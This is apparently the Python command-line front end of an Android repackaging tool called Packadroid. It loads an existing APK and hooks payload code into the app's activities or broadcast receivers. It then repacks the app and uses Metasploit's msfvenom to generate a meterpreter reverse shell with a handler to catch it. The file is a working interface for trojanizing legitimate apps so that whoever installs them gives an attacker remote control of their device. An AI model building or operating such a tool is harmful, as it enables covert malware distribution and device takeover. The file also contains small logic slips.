import sys
import subprocess

from cmd import Cmd
from packadroid.interactive_shell.packadroid_session import PackadroidSession
from packadroid.hookmanager.hook import Hook
import inspect

ERR = True
SUC = False

class PackadroidPrompt(Cmd):
    def __init__(self):
        Cmd.__init__(self)
        self.prompt = '> '
        self.__setup_session()

    def start(self):
        self.cmdloop("Started Packadroid Interactive Shell")
        try:
            while True:
                # There might be errors while executing a command, but we want to keep the prompt open
                self.cmdloop("")
        except Exception:
            self.__packadroid_session.cleanup()
            raise

    def do_help(self, args):
        """ Usage: help - shows available methods without problems"""
        x = inspect.getmembers(PackadroidPrompt)
        print("Available methods")
        for tuple in x:
            if tuple[0].startswith("do_"):
                line = tuple[0][3:].ljust(30)
                if tuple[1].__doc__ is None:
                    line += "<no documentation available>"
                else:
                    line += str(tuple[1].__doc__)
                print(line)

    def do_set_verbose(self, args):
        """ Usage: set_verbose <value>, enables (1) or disables (0) the verbose mode which shows enriched shell output."""
        args = args.split(" ")
        print(args)
        if len(args) == 1:
            value = int(args[0])
            print(value)
            if value == 0 or value == 1:
                print(value)
                self.__packadroid_session.set_verbose(value)
                return SUC
            else:
                print("Invalid value provided. Only 1(enabling) or 0(disabling) are available.")
                return ERR
        else:
            print("Invalid number of arguments provided.")
            return ERR

    def do_load_original(self, args):
        """ Usage: load_original <path_to_original_apk> -- Load an .apk file you want inject code to. """
        args = args.split(" ")
        if len(args) != 1:
            print("You have to provide the path to an valid .apk file!")
            return ERR
        if self.__packadroid_session.load_original_apk(args[0]) is None:
            return ERR
        return SUC

    def do_exit(self, args):
        """ Usage: exit [-f] -- Close the interactive prompt without changing anything. """
        args = args.split(" ")
        if len(self.__packadroid_session.get_hooks())  < 1:
            self.__exit(0)
        elif len(args) > 0 and args[0] == "-f":
            self.__exit(0)
        print("If you really want to discard all changes and exit, add -f to the exit command!")
        return ERR

    def do_list_activities(self, args):
        """ Usage: list_activities -- List the activities of the loaded original application. [*] marks launcher activities. The number before each activity is its ID. This ID can be used in the add_activity_hook command."""
        if not self.__packadroid_session.is_original_apk_loaded():
            print("No original application loaded!")
            return ERR
        i = 0
        for act, is_launcher in self.__packadroid_session.list_activities():
            print(str(i).ljust(4) + ":\t" + act + (" [*]" if is_launcher else ""))
            i += 1
        return SUC

    def do_repack(self, args):
        """ Usage: repack [repacked_apk_path] -- Repack the .apk file as configured! """
        args = args.split(" ")
        if len(args) != 0 and args[0] != "":
            if args[0] != "":
                ret = self.__packadroid_session.repack(args[0])
            else:
                ret = self.__packadroid_session.repack(args[0])
        else:
            print("Unknown format!")
            return ERR

        if ret is None:
            print("Error while repacking!")
            return ERR
        else:
            print("Successful")
            self.__packadroid_session.cleanup()
            self.__setup_session() # Clean old state

        return SUC

    def do_add_activity_hook(self, args):
        """ Usage: add_activity_hook <activity name OR activity ID> <payload_apk_path> <class> <method> -- Add a new hook to the given activity for the given payload. The activity IDs can be listed with list_activities."""
        args = args.split(" ")
        if len(args) < 4:
            print("Unknown format!")
            return ERR
        self.__packadroid_session.add_hook("activity", args[0], args[2], args[3], args[1])
        return SUC


    def do_add_broadcast_hook(self, args):
        """ Usage: add_broadcast_hook <broadcast> <payload_apk_path> <class> <method> -- Add a new hook to the given intent as a broadcastreceiver. """
        args = args.split(" ")
        if len(args) < 4:
            print("Unknown format!")
            return ERR
        print("[*] Add new broadcast hook")
        self.__packadroid_session.add_hook("broadcast_receiver", args[0], args[2], args[3], args[1])
    
    def do_list_added_hooks(self, args):
        """ Usage: list_added_hooks   -- Lists all hooks which have already been added by the user. Each hook has an ID which can be used to remove hooks. """
        self.__packadroid_session.list_hooks()
    
    def do_remove_hook(self, args):
        """ Usage: remove_hook <index>  -- Remove hook with given index. For retrieving the index of each hook use the list_added_hooks function,. """
        if len(args) != 1:
            print("Unknown format!")
            return ERR
        try:
            int(args[0])
        except:
            print("Input is not an index!")
            return ERR
        self.__packadroid_session.remove_hook(int(args[0]))

    def do_generate_meterpreter(self, args):
        """ Usage: generate_meterpreter <IP> <lport> -- Generate a reverse shell (meterpreter) with given IP and port. Metasploit necessary! """
        args = args.split(" ")
        if len(args) != 2:
            print("Unknown format!")
            return ERR
        
        # is metasploit installed
        proc = subprocess.Popen(["which msfvenom"], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        if out == "":
            print("Metasploit is not installed! Please install Metasploit")
            return ERR
        self.__packadroid_session.generate_meterpreter(args[0], args[1])

    def do_start_meterpreter_handler(self, args):
        """ Usage: start_meterpreter_handler <IP> <lport> -- Generate a handler which is catchign the reverse shell """
        args = args.split(" ")
        if len(args) != 2:
            print("Unknown format!")
            return ERR
        
        # is metasploit installed
        proc = subprocess.Popen(["which msfvenom"], stdout=subprocess.PIPE, shell=True)
        (out, err) = proc.communicate()
        if out == "":
            print("Metasploit is not installed! Please install Metasploit")
            return ERR
        self.__packadroid_session.start_meterpreter_handler(args[0], args[1])

    def execute_commands(self, cmds):
        """
        Execute a list of commands given in a 'configuration' file.

        :param cmds: List of commands to execute.
        :type cmds: [str]
        """
        for cmd in cmds:
            if cmd.startswith("#") or cmd == "":
                # used as comment
                continue
            print("[*] " + cmd)               
            if self.onecmd(cmd): # Stop -> An error happened in one of the commands!
                self.__exit(1)

    def get_session(self):
        return self.__packadroid_session

    def __setup_session(self):
        self.__packadroid_session = PackadroidSession()

    def __exit(self, code):
        self.__packadroid_session.cleanup()
        sys.exit(code)
